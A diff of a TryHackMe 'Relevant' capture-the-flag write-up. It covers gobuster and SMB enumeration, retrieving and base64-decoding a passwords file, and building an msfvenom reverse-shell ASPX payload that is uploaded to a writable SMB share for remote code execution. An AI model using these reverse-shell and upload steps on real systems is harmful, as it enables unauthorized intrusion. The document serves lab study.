@@ -1,23 +1,54 @@
 
 enumeration
+
+![nmap scan screenshot ](https://github.com/ClearLotus-git/writeups/blob/main/TryHackMe/Relevant/screenshots/Screenshot%202025-05-28%20151506.png?raw=true)
+![continued nmap screenshot](https://github.com/ClearLotus-git/writeups/blob/main/TryHackMe/Relevant/screenshots/Screenshot%202025-05-28%20152835.png?raw=true)
+
 ```
 gobuster dir -u http://10.10.50.140 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x php,html,txt
 ```
+![gobuster scan](https://github.com/ClearLotus-git/writeups/blob/main/TryHackMe/Relevant/screenshots/Screenshot%202025-05-28%20152608.png?raw=true)
+
 smb
+
+To show what was listed in the smb share.
 ```
 smbclient -L \\\\10.10.50.140\\
 ```
 ```
 smbclient  \\\\10.10.10.144\\nt4wrksv
 ```
-make payload  (note check payload is the same in msfvenom and msfconsole
+![smb](https://github.com/ClearLotus-git/writeups/blob/main/TryHackMe/Relevant/screenshots/Screenshot%202025-05-28%20154052.png?raw=true)
+
+The `get` command wasn't working. I added a destination for the passwds.txt
+![smb transfer file](https://github.com/ClearLotus-git/writeups/blob/main/TryHackMe/Relevant/screenshots/Screenshot%202025-05-28%20154125.png?raw=true)
+
+
+The strings needed to be decoded base64
+![base64 -d](https://github.com/ClearLotus-git/writeups/blob/main/TryHackMe/Relevant/screenshots/Screenshot%202025-05-28%20154538.png?raw=true)
+
+RCE vulnerability via an insecure file upload path that uses SMB shares as the storage backend.
+
+For testing I tried to see if i could access the share through a browser. Seeing if 
+I could put test.txt into the smb. In the smb share `put text.txt`
+![text.txt in browser](https://github.com/ClearLotus-git/writeups/blob/main/TryHackMe/Relevant/screenshots/Screenshot%202025-05-28%20161907.png?raw=true)
+
+
+make payload  (note check payload is the same in msfvenom and msfconsole)
 ```
 sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.137.19 LPORT=8910 -f aspx -o reverse1.aspx
 ```
+![payload](https://github.com/ClearLotus-git/writeups/blob/main/TryHackMe/Relevant/screenshots/Screenshot%202025-05-28%20155335.png?raw=true)
+
 in the smb share add   
 ```
-put reverse1.aspx
+put reverse.aspx
 ```
+![aspx in smb](https://github.com/ClearLotus-git/writeups/blob/main/TryHackMe/Relevant/screenshots/Screenshot%202025-05-28%20155759.png?raw=true)
+
+
+
+
 
 browser
 ```
